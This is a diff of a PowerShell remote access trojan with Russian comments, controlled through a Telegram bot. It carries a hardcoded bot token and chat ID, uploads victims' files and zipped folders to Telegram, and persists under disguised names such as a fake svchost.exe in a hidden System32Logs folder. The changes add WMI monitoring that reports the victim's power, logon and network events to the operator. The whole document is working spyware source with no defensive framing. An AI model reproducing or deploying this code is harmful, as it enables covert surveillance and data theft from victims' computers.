@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ БЕЗ ДИАЛОГОВ
+# RAT через Telegram Bot - С МОНИТОРИНГОМ СОСТОЯНИЯ ПК
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -70,81 +70,43 @@ function Send-Telegram {
     }
 }
 
-# Функция отправки файлов - ПОЛНОСТЬЮ ПЕРЕПИСАНА
+# Функция отправки файлов
 function Send-TelegramFile {
     param([string]$FilePath)
     
     $url = "https://api.telegram.org/bot$Token/sendDocument"
     
     try {
-        # Используем WebClient для избежания диалогов
-        $webClient = New-Object System.Net.WebClient
-        
-        # Создаем временный файл с уникальным именем
-        $tempDir = "$env:TEMP\TelegramUpload_$(Get-Random)"
-        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
-        attrib +s +h "$tempDir" 2>&1 | Out-Null
-        
-        $originalName = Split-Path $FilePath -Leaf
-        $tempFilePath = Join-Path $tempDir $originalName
-        
-        # Копируем файл с принудительной перезаписью
-        Copy-Item $FilePath $tempFilePath -Force
-        
-        # Формируем multipart запрос вручную
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
         $boundary = [System.Guid]::NewGuid().ToString()
-        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
-        $encoding = [System.Text.Encoding]::GetEncoding("iso-8859-1")
-        
-        # Формируем тело запроса
-        $bodyBuilder = New-Object System.Text.StringBuilder
-        
-        # Добавляем chat_id
-        $bodyBuilder.AppendLine("--$boundary") | Out-Null
-        $bodyBuilder.AppendLine('Content-Disposition: form-data; name="chat_id"') | Out-Null
-        $bodyBuilder.AppendLine() | Out-Null
-        $bodyBuilder.AppendLine($ChatID) | Out-Null
-        
-        # Добавляем файл
-        $bodyBuilder.AppendLine("--$boundary") | Out-Null
-        $bodyBuilder.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"") | Out-Null
-        $bodyBuilder.AppendLine("Content-Type: application/octet-stream") | Out-Null
-        $bodyBuilder.AppendLine() | Out-Null
-        
-        $bodyBytes = $encoding.GetBytes($bodyBuilder.ToString())
-        
-        # Создаем конечный массив байтов
-        $endLine = $encoding.GetBytes("`r`n--$boundary--`r`n")
-        $finalBytes = $bodyBytes + $fileBytes + $endLine
-        
-        # Отправляем запрос
-        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-        $response = $webClient.UploadData($url, "POST", $finalBytes)
-        
-        # Очищаем временные файлы
-        Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
-        Remove-Item $tempDir -Force -ErrorAction SilentlyContinue
-        $webClient.Dispose()
-        
-        return $true
-        
+
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            $ChatID,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream",
+            "",
+            $fileEnc,
+            "--$boundary--"
+        ) -join "`r`n"
+
+        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
     } catch {
         try {
-            # Резервный метод - используем Invoke-RestMethod с MemoryStream
-            $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
-            $fileStream = New-Object System.IO.MemoryStream(,$fileContent)
-            
+            # Резервный метод отправки файла
+            $fileInfo = Get-Item $FilePath
+            $fileStream = [System.IO.File]::OpenRead($FilePath)
             $form = @{
                 chat_id = $ChatID
                 document = $fileStream
             }
             Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
             $fileStream.Close()
-            $fileStream.Dispose()
-            return $true
-        } catch {
-            return $false
-        }
+        } catch { }
     }
 }
 
@@ -167,6 +129,83 @@ function Compress-Folder {
         } catch {
             return $false
         }
+    }
+}
+
+# Функция мониторинга состояния системы
+function Start-SystemMonitor {
+    # Регистрируем события питания
+    $powerQuery = "SELECT * FROM Win32_PowerManagementEvent"
+    Register-WmiEvent -Query $powerQuery -Action {
+        $event = $EventArgs.NewEvent
+        $global:Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
+        $global:ChatID = "5674514050"
+        
+        function Quick-Send {
+            param([string]$Text)
+            $url = "https://api.telegram.org/bot$($global:Token)/sendMessage"
+            $body = @{chat_id = $global:ChatID; text = $Text}
+            try {
+                Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
+            } catch { }
+        }
+        
+        switch ($event.EventType) {
+            4 { Quick-Send "💤 Компьютер переходит в спящий режим" }
+            7 { Quick-Send "🔋 Компьютер вышел из спящего режима" }
+            10 { Quick-Send "⏻ Компьютер выключается" }
+            11 { Quick-Send "🔋 Компьютер вышел из гибернации" }
+            12 { Quick-Send "💤 Компьютер переходит в гибернацию" }
+            13 { Quick-Send "⚡ Обнаружено критическое выключение (потеря питания)" }
+            18 { Quick-Send "🔋 Работа от батареи" }
+            19 { Quick-Send "⚡ Работа от сети" }
+        }
+    } | Out-Null
+    
+    # Мониторинг сессии пользователя
+    $sessionQuery = "SELECT * FROM Win32_SessionChangeEvent"
+    Register-WmiEvent -Query $sessionQuery -Action {
+        $event = $EventArgs.NewEvent
+        $global:Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
+        $global:ChatID = "5674514050"
+        
+        function Quick-Send {
+            param([string]$Text)
+            $url = "https://api.telegram.org/bot$($global:Token)/sendMessage"
+            $body = @{chat_id = $global:ChatID; text = $Text}
+            try {
+                Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
+            } catch { }
+        }
+        
+        switch ($event.EventType) {
+            2 { Quick-Send "👤 Пользователь вошел в систему: $($event.SessionID)" }
+            3 { Quick-Send "🚪 Пользователь вышел из системы: $($event.SessionID)" }
+            4 { Quick-Send "🔒 Сессия заблокирована" }
+            5 { Quick-Send "🔓 Сессия разблокирована" }
+            7 { Quick-Send "👤 Контроль перехвачен (Remote Desktop)" }
+        }
+    } | Out-Null
+    
+    # Мониторинг сетевых подключений
+    $networkQuery = "SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus=2"
+    $lastNetworkState = $true
+    
+    while ($true) {
+        try {
+            $currentNetwork = Get-WmiObject -Query $networkQuery
+            $currentState = ($currentNetwork.Count -gt 0)
+            
+            if ($currentState -ne $lastNetworkState) {
+                if ($currentState) {
+                    Send-Telegram "🌐 Сетевое подключение восстановлено"
+                } else {
+                    Send-Telegram "❌ Сетевое подключение потеряно"
+                }
+                $lastNetworkState = $currentState
+            }
+        } catch { }
+        Start-Sleep -Seconds 30
     }
 }
 
@@ -203,15 +242,14 @@ function Invoke-Cleanup {
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
         "$env:WINDIR\System32\System32Logs\svchost.exe",
-        "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted\windows_update.marker",
-        "$env:TEMP\TelegramUpload_*"
+        "$env:TEMP\windows_update.marker"
     )
 
     $deletedFiles = @()
     foreach ($filePattern in $filesToDelete) {
         try {
             Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
-                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue -Recurse
+                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                 $deletedFiles += $_.FullName
             }
         } catch { }
@@ -272,18 +310,12 @@ $($regEntries -join "`n")
 }
 
 # Установка в автозагрузку с улучшенной маскировкой
-$installMarkerDir = "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
-if (!(Test-Path $installMarkerDir)) {
-    New-Item -Path $installMarkerDir -ItemType Directory -Force | Out-Null
-    attrib +s +h +r "$installMarkerDir" 2>&1 | Out-Null
-}
-$installMarker = "$installMarkerDir\windows_update.marker"
+$installMarker = "$env:TEMP\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
     # Создаем маркер установки с безобидным именем
     "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
-    attrib +s +h +r "$installMarker" 2>&1 | Out-Null
     
     # Новая скрытая папка в системной директории
     $hiddenFolder = "$env:WINDIR\System32\System32Logs"
@@ -330,8 +362,14 @@ try {
     Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
 } catch { }
 
+# Запускаем мониторинг системы в отдельном потоке
+Start-Job -ScriptBlock ${function:Start-SystemMonitor} -Name "SystemMonitor"
+
 # Отправка информации о запуске
-Send-Telegram "RAT активирован на $env:COMPUTERNAME
+Send-Telegram "🟢 RAT активирован на $env:COMPUTERNAME
+💻 Пользователь: $env:USERNAME
+🕐 Время запуска: $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')
+
 Доступные команды:
 /help - список команд
 /ls - список файлов
@@ -404,38 +442,29 @@ $($fileList -join "`n")"
                             $fullPath = Join-Path $currentDir $target
                             
                             if (Test-Path $fullPath) {
-                                Send-Telegram "⏳ Начинаю отправку файла: $target"
-                                
                                 if (Test-Path $fullPath -PathType Container) {
                                     # Архивируем папку
                                     $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                     if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
-                                        $result = Send-TelegramFile -FilePath $zipPath
-                                        if ($result) {
-                                            Send-Telegram "✅ Папка $target успешно отправлена"
-                                        } else {
-                                            Send-Telegram "❌ Ошибка отправки папки: $target"
-                                        }
+                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                     } else {
-                                        Send-Telegram "❌ Ошибка архивации папки: $target"
+                                        Send-Telegram "Ошибка архивации папки: $target"
                                     }
                                 } else {
-                                    $result = Send-TelegramFile -FilePath $fullPath
-                                    if ($result) {
-                                        Send-Telegram "✅ Файл $target успешно отправлен"
-                                    } else {
-                                        Send-Telegram "❌ Ошибка отправки файла: $target"
-                                    }
+                                    Send-Telegram "Файл $target отправлен" $fullPath
                                 }
                             } else {
-                                Send-Telegram "❌ Файл/папка не найдены: $target"
+                                Send-Telegram "Файл/папка не найдены: $target"
                             }
                         }
                         "^/destroy$" {
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
+                                # Останавливаем мониторинг
+                                Get-Job -Name "SystemMonitor" | Remove-Job -Force
+                                
                                 # Запускаем встроенную функцию очистки
                                 $cleanupResult = Invoke-Cleanup
                                 
